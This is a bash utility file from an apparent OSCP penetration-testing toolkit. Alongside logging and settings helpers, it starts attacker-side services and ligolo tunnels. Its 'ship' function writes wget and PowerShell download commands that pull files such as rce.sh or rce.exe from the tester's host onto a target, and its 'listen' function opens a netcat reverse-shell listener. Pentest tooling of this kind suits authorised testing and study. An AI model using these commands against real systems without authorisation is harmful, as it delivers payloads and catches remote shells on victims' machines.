#!/bin/bash
# About utils.sh
# utils.sh is a collection of utility functions that are used across the oscp-swiss scripts.


swiss_root="$HOME/oscp-swiss"
swiss_script="$swiss_root/script"
swiss_alias="$swiss_root/script/alias.sh"
swiss_extension="$swiss_root/script/extension.sh"

swiss_utils="$swiss_root/utils"
swiss_module="$swiss_root/script/module"
swiss_private="$swiss_root/private"
swiss_wordlist="$swiss_root/wordlist"
swiss_settings="$swiss_root/settings.json"

# Description: _log is the low level function for logging which wrap the echo command with ANSI color codes.
# Usage: _log [options] <text>
function _log() {
    local bold=""
    local fg_color=""
    local bg_color=""
    local no_color=0
    local text=""
    local underline=""
    local newline=1
    local ansi_reset="\033[0m"

    while [ "$1" ]; do
        case "$1" in
            --bold) bold="\033[1m" && shift ;;
            -u|--underline) underline="\033[4m" && shift ;;
            -f|--foreground)
                shift
                case "$1" in
                    black) fg_color="\033[30m" ;;
                    red) fg_color="\033[31m" ;;
                    green) fg_color="\033[32m" ;;
                    yellow) fg_color="\033[33m" ;;
                    blue) fg_color="\033[34m" ;;
                    magenta) fg_color="\033[35m" ;;
                    cyan) fg_color="\033[36m" ;;
                    white) fg_color="\033[37m" ;;
                    gray) fg_color="\033[90m" ;;
                    *) fg_color="" ;;
                esac
                shift
                ;;
            -b|--background)
                shift
                case "$1" in
                    black) bg_color="\033[40m" ;;
                    red) bg_color="\033[41m" ;;
                    green) bg_color="\033[42m" ;;
                    yellow) bg_color="\033[43m" ;;
                    blue) bg_color="\033[44m" ;;
                    magenta) bg_color="\033[45m" ;;
                    cyan) bg_color="\033[46m" ;;
                    white) bg_color="\033[47m" ;;
                    gray) bg_color="\033[100m" ;;
                    *) bg_color="" ;;
                esac
                shift
                ;;
            --no-color) no_color=1 && shift ;;
            -n|--no-newline) newline=0 && shift ;;
            *) text="$1" && shift ;;
        esac
    done

    if [ "$_swiss_disable_color" = true ]; then
        [ "$newline" -eq 1 ] && echo -e "$text" || echo -e -n "$text"
    else
        [ "$newline" -eq 1 ] && newline_flag="" || newline_flag="-n"
        echo -e $newline_flag "${bold}${underline}${fg_color}${bg_color}${text}${ansi_reset}"
    fi
}

# Description:
#   _check_logger_level is a helper function to check the logger level,
#   the function will return 0 if the given level is equal or higher than the global logger level.
# Configuration:
#   - global_settings.logger_level <debug|info|warn|error>: default is info.
# Usage: _check_logger_level <level>
function _check_logger_level() {
    case "$_swiss_logger_level" in
        debug) return 0 ;;
        info) [[ "$1" != "debug" ]] ;;
        warn) [[ "$1" == "warn" || "$1" == "error" ]] ;;
        error) [[ "$1" == "error" ]] ;;
        *) return 1 ;;
    esac
}

# Description: wrap the _log function with the given level.
# Usage: swiss_logger <level> <text>
function swiss_logger() {
    case "$1" in
        debug) _check_logger_level "debug" && _log -f gray "$@" ;;
        info) _check_logger_level "info" && _log -f green "$@" ;;
        warn) _check_logger_level "warn" && _log -f yellow "$@" ;;
        error) _check_logger_level "error" && _log --bold -f red "$@" ;;
        # prompt must be display in any given level
        prompt) _check_logger_level "error" && _log -f green "$@" ;;
        hint) _log -f cyan "$@" ;;
        important-instruction) _log --bold -f red "$@" ;;
        warn-instruction) _log --bold -f yellow "$@" ;;
        info-instruction) _log --bold -f green "$@" ;;
        highlight) _log --bold -f white -b red "$@" ;;
        *) echo -n "$@" ;;
    esac
}

# Description:
#   Load all scripts under the $oscp-swiss/private directory.
#   If you have any private aliases, functions or variables, you can put them in the private directory.
#   Or if you already have a bunch of scripts, you can put them in the directory without any changes.
# Usage: _load_private_scripts
function _load_private_scripts() {
    if [ -d "$swiss_private" ]; then
        for script in "$swiss_private"/*.sh; do
            if [ -f "$script" ]; then
                source "$script"
            fi
        done
    else
        swiss_logger error "[e] Directory $swiss_private not found."
    fi
}

# Description: Get the default network interface's IP address.
# Configuration:
#   - global_settings.default_network_interface: default is eth0.
# Usage: _get_default_network_interface_ip
function _get_default_network_interface_ip() {
    ip -o -f inet addr show | grep $_swiss_default_network_interface | awk '{split($4, a, "/"); printf "%s", a[1]}'
}

# Description: Display a banner for commands, which are replaced by aliases.
# Configuration:
#   - global_settings.disable_sys_custom_command_banner <boolean>: feature flag to disable the banner.
# Usage: _override_cmd_banner
function _override_cmd_banner() {
    if [[ "$disable_sys_custom_command_banner" = false ]]; then
        swiss_logger highlight "[ custom command, for default, add the sign _ in front of the command ]\n";
    fi
}

# Description: Display a banner for extension functions.
# Usage: _extension_fn_banner
function _extension_fn_banner() {
    swiss_logger highlight "[ The function may relies on non-native command, binaries, and libraries. You may need to check extension.sh before the run ]\n";
}

# Description:
#   Load the settings from the settings.json file.
#   All the key-value pairs under `global_settings` and `functions` are exported as environment variables.
#   Default location: $HOME/oscp-swiss/settings.json
# Usage: _load_settings
function _load_settings() {
    if [ ! -f "$swiss_settings" ]; then
        swiss_logger error "[e] $swiss_settings not found."
        return 1
    fi
    while IFS="=" read -r key value; do
        export "_swiss_$key"="$value"
    done < <(jq -r '.global_settings | to_entries | .[] | "\(.key)=\(.value)"' "$swiss_settings")
    while IFS="=" read -r key value; do
        export "_swiss_$key"="$value"
    done < <(jq -r '.functions | to_entries[] | .key as $k | .value | to_entries[] | "\($k)_\(.key)=\(.value)"' "$swiss_settings")
}

# Description: Check if the given command exists.
# Usage: _cmd_is_exist <command>
function _cmd_is_exist() {
    if command -v "$1" &> /dev/null; then
        echo 1
    else
        echo 0
    fi
}

# Description: wrap a function execution.
# Usage: _wrap <commands>
# TODO: extend to all functions.
function _wrap() {
    local command="$*"
    swiss_logger warn-instruction "[SWISS] Following command is executed:"
    swiss_logger important-instruction "$command"
    eval "$command"
}

# Description: Disable the automatic exploitation function.
# Configuration:
#   - global_settings.disable_auto_exploit_function <boolean>: feature flag to disable the function.
# Usage: _disable_auto_exploit_function
function _disable_auto_exploit_function() {
    #####################################################################
    #   IMPORTANT                                                       #
    #   In the current version (1.5.2), no function is auto exploit and #
    #   no function is calling _disable_auto_exploit_function.          #
    #   This is just for the future use.                                #
    #####################################################################
    swiss_logger highlight "[ The function MAY considered as automatic exploitation. Make sure you read the scripts! ]"
    [[ "$_swiss_disable_auto_exploit_function" = true ]] && return 1
}

# Description:
#   Simplified version of the `ip a` command to show the IP address of the default network interface.
#   The default network interface's IP address is copied to the clipboard.
# Usage: i [-c, --copy] [-h, --help]
# Arguments:
#   -c, --copy: copy the default interface IP.
function i() {
    local auto_copy=false
    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--copy)
                auto_copy=true
                shift
            ;;
            -h|--help)
                _help
                return 0
            ;;
            *)
                swiss_logger error "[e] invalid options. see -h, --help."
                return 1
            ;;
        esac
    done
    local default_ip="$(_get_default_network_interface_ip)"
    swiss_logger info "[i] $_swiss_default_network_interface: $default_ip"

    if [[ "$auto_copy" = true ]]; then
        echo -n $default_ip | xclip -selection clipboard
    fi
}

# Description: one-liner to start services.
# Usage: svc <service> [OPTIONS]
# Arguments:
#   - service: current support:
#     + docker          start docker service
#     + ftp             start a ftp server
#     + http            start a http server on port 80
#     + smb             start a smb server
#     + ssh             start sshd service
#     + bloodhound      start BloodHound (v4.3.1)
#     + bloodhound-ce   start BloodHound CE (v2.4.1)
#     + ligolo          start ligolo-ng_agent (v0.6.2)
#     + wsgi            start wsgid
#     + python-venv     create a python virtual environment
#   - Options
#     + -p, --port PORTS    Ports used (http)
# Configuration:
#   - function.svc_wsgi.default_port <integer>: default is 443.
# Example:
#   svc http # to spawn a http server in the current directory
#   svc ftp  # to spawn a ftp server in the current directory
function svc() {
    local service="$1"
    [[ -z "$service" ]] && _help && return 1

    case "$service" in
        docker)
            swiss_logger info "[i] start docker"
            swiss_logger warn "[w] to stop, use the following commands: "
            swiss_logger warn "[w] \tsudo systemctl stop docker"
            swiss_logger warn "[w] \tsudo systemctl stop docker.socket"
            _wrap sudo service docker restart
            ;;
        ftp)
            swiss_logger info "[i] start ftp server on host"
            swiss_logger info "Usage:"
            swiss_logger info "\t(1) run ftp"
            swiss_logger info "\t(2) run open <ip> 21"
            swiss_logger info "\t(2-2) Default Interface ($_swiss_default_network_interface) IP: $(_get_default_network_interface_ip)"
            swiss_logger info "\t(3) use username anonymous"
            swiss_logger info "\t(4) binary # use binary mode"
            swiss_logger info "\t(5) put <file-you-want-to-download>"
            _wrap python3 -m pyftpdlib -w -p 21
            ;;
        http)

            local port="80"
            [[ $2 == "-p" || $2 == "--port" ]] && port=$3

            swiss_logger info "[i] start http server"
            swiss_logger warn "[w] python3 -m http.server $port"
            i
            _wrap python3 -m http.server $port
            ;;
        smb)
            swiss_logger info "[i] start smb server"
            swiss_logger info "[i] impacket-smbserver smb . -smb2support"
            swiss_logger info "[i] using default name smb"
            i
            _wrap impacket-smbserver smb . -smb2support
            ;;
        ssh)
            swiss_logger info "[i] start ssh server"
            swiss_logger warn "[w] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            _wrap sudo systemctl start ssh
            ;;
        bloodhound)
            swiss_logger info "[i] start BloodHound (v2.4.3) ..."
            # TODO: add more instructions & reproduce from skretch
            _wrap sudo neo4j console
            ;;
        bloodhound-ce)
            _extension_fn_banner
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            swiss_logger info "[i] start BloodHound CE (v2.4.1) ..."
            swiss_logger info "[i] start port check on 8080"

            # Check if port 8080 is open
            lsof -i :8080 > /dev/null && swiss_logger error "[e] Port 8080 is open. Exited" && exit 1

            swiss_logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            swiss_logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            swiss_logger info "[i] preferred password: @Bloodhound123"

            _wrap sudo docker-compose up
            ;;
        ligolo)
            _extension_fn_banner
            swiss_logger warn "[w] one-time setup: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up"
            swiss_logger info "[i] Example (On target): "
            swiss_logger info "[i] Linux: .\ligolo-ng_agent_0.6.2_linux_amd64 -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            swiss_logger info "[i] Windows: .\ligolo-ng_agent_0.6.2_windows_amd64.exe -connect $(_get_default_network_interface_ip):443 -ignore-cert"
            swiss_logger info "[i] after connection: "
            swiss_logger info "[i] > session                                    # choose the session"
            swiss_logger info "[i] > ifconfig                                   # check interface"
            swiss_logger info "[i] sudo ip route add 192.168.0.0/24 dev ligolo  # add interface"
            swiss_logger warn "[w] ip route del 122.252.228.38/32               # removal after use"
            swiss_logger info "[i] start                                        # start the agent"
            swiss_logger info "[i] Add listener (e.g., for svc http): listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp"
            swiss_logger info "[i] Port Forwarding (access via 240.0.0.1): sudo ip route add 240.0.0.1/32 dev ligolo"
            # TODO: add to configuration
            local ligolo_agent_path="$swiss_utils/tunnel/ligolo-0.6.2/proxy"
            _wrap $ligolo_agent_path -selfcert -laddr 0.0.0.0:443
            ;;
        wsgi)
            _extension_fn_banner
            swiss_logger info "[i] start wsgidav under the directory: $(pwd)"
            swiss_logger info "[i] port used: 80"
            i
            _wrap $_swiss_svc_wsgi --host=0.0.0.0 --port=$_swiss_svc_wsgi_default_port --auth=anonymous --root .
            ;;
        python-venv)
            _extension_fn_banner
            _wrap python3 -m venv .venv
            _wrap source .venv/bin/activate
            ;;
        *) _help && return 1 ;;
    esac
}

# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-h, --help] [-t|--type <linux|windows>] [-a|--auto-host <boolean>] [-m, --mode <http|smb>] [-p, --port PORT] <filepath 1> [filepath 2] ...
# Arguments:
#   -t, --type <type>: linux or windows (default: linux)
#   -a, --auto-host <boolean>: auto-host the http server (default: true)
#   -m, --mode <mode>: http or smb (default: http)
#   -p, --port PORT: used port (current only support on http)
#   filepath: the path to the file you want to ship. Support multiple files at a time.
# Example:
#   ship ./rce.sh
#   ship -t windows $windows_family
#   ship -t windows -m smb ./rce.exe
function ship() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local type="linux"
    local mode="http"
    local autoHost=true
    local filepaths=()
    local used_port="80"
    # TODO: implement default output path

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type) type="$2" && shift 2 ;;
            -a|--auto-host) autoHost="$2" && shift 2 ;;
            -m|--mode) mode="$2" && shift 2 ;;
            -p|--port) used_port="$2" && shift 2 ;;
            *) filepaths+=("$1") && shift ;;
        esac
    done

    [[ ${#filepaths[@]} -eq 0 ]] && swiss_logger error "[e] At least one filepath is required." && _help && return 1

    local all_cmds=""

    for filepath in "${filepaths[@]}"; do
        [[ ! -f "$filepath" ]] && swiss_logger error "[e] File '$filepath' does not exist." && return 1
    
        local filename=$(basename "$filepath")
        cp --update=none "$filepath" "./$filename" && swiss_logger info "[i] File '$filename' copied to current directory."

        local cmd
        if [[ "$type" == "linux" ]]; then
            if [[ "$mode" == "http" ]]; then
                cmd="wget $(_get_default_network_interface_ip):$used_port/$filename"
            else
                swiss_logger error "[e] Currently Linux only support HTTP mode." && return 1
            fi
        elif [[ "$type" == "windows" ]]; then
            if [[ "$mode" == "smb" ]]; then
                cmd="copy \\\\\\$(_get_default_network_interface_ip)\\\\smb\\\\$filename C:/ProgramData/$filename"
            elif [[ "$mode" == "http" ]]; then
                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip):$used_port/$filename' -OutFile C:/ProgramData/$filename\""
            else
                swiss_logger error "[e] unsupported type (smb|http)."
            fi
        else
            log error "[e] Unknown type '$type'." && return 1
        fi

        all_cmds+="$cmd"$'\n'
    done

    _autoHost() {
        if [[ "$autoHost" = true ]]; then
            if [[ "$mode" == "smb" ]]; then
                svc smb
            elif [[ "$mode" == "http" ]]; then
                svc http --port "$used_port"
            fi
        else
            swiss_logger warn "[w] Remember to host the web server on your own"
        fi
    }

    echo -n "$all_cmds" | xclip -selection clipboard
    swiss_logger info "[i] All commands copied to clipboard."
    _autoHost

    # TODO: remove the copied files automatically with global conf
}

# Description: One-liner to start a interactive reverse shell listener.
# Usage: listen <port>
function listen() {
    i
    _wrap rlwrap nc -lvnp $1
}

# Description: 
#   _help generates a shell-script Docstring.
#   By default, it uses in a function, and prints all information from the line
#   "# Description" to the end of function $function-name()
# Usage: _help
_help() {
    local script_file
    local function_name
    local annotations=""
    local start_reading=false

    if [ -n "$ZSH_VERSION" ]; then
        function_name="${funcstack[-1]}"
        script_file="${functions_source[$function_name]}"
    elif [ -n "$BASH_VERSION" ]; then
        function_name="${FUNCNAME[1]}"
        script_file="${BASH_SOURCE[1]}"
    else
        swiss_logger error "[e] Only Zsh and Bash shells are supported."
        return 1
    fi

    while IFS= read -r line; do
        if [[ $line =~ ^#\ Description ]]; then
            start_reading=true
            annotations="${line/#\# /}"$'\n'
            continue
        fi

        if $start_reading && [[ $line =~ ^# ]]; then
            annotations+="${line/#\# /}"$'\n'
            continue
        fi

        if [[ $line =~ ^function\  ]]; then
            if [[ $line =~ ^function\ $function_name\(\) ]]; then
                echo -e "$annotations"
                return 0
            fi
            start_reading=false
            annotations=""
        fi
    done < "$script_file"

    # If no annotations were found for the function
    swiss_logger warn "[w] No annotations found for function: $function_name"
}

_load_settings
_load_private_scripts